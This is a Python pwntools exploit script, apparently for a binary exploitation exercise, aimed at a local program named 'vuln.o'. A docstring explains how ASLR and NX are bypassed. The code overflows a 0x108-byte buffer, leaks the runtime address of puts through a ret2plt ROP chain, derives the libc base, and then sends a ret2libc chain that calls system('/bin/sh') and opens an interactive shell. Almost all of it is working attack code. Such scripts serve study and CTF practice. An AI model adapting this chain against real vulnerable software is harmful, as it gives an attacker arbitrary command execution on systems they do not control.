#!/usr/bin/env python3

"""
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
ASLR:       Enabled

ASLR (Address Space Layout Randomization) is a security mechanism that randomizes the virtual memory address space of a process each time it is executed. 
With ASLR enabled, absolute addresses of memory sections like the heap, stack, and libraries (e.g., libc) are randomized. Combined with the NX-bit, which 
makes certain writable sections as non-executable, this creates a dual layer of protection against traditional exploits.

In this scenario, we cannot execute shellcode directly on the stack (due to NX-bit) nor rely on static libc addresses (due to ASLR). 
To bypass these protections, we use a two-stage approach:

1. Leak the runtime address of a libc function (e.g., puts) to calculate the libc base address.
2. Use the calculated libc base to determine the addresses of system and the "/bin/sh" string. Then, invoke system("/bin/sh") to gain control.

"""

from pwn import *

context(os="linux", arch="amd64")

bin = context.binary = ELF("./vuln.o")

bin_rop = ROP("./vuln.o")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

io = start()

# ret2plt

pop_rdi = bin_rop.find_gadget(["pop rdi", "ret"])[0]

ret = bin_rop.find_gadget(["ret"])[0]

payload = b""

junk = b"A" * 0x108

payload = (
    junk + pack(pop_rdi) + pack(bin.got.puts) + pack(bin.sym.puts) + pack(bin.sym.main)
)

io.sendline(payload)

leak = io.recvlines(2)[1]

real_leak = unpack(leak, "all")

libc_base = real_leak - libc.sym.puts

system = libc_base + libc.sym.system

shell = libc_base + next(libc.search(b"/bin/sh"))

# ret2libc

payload = cyclic(0x108) + pack(pop_rdi) + pack(shell) + pack(ret) + pack(system)

io.sendline(payload)

io.interactive()
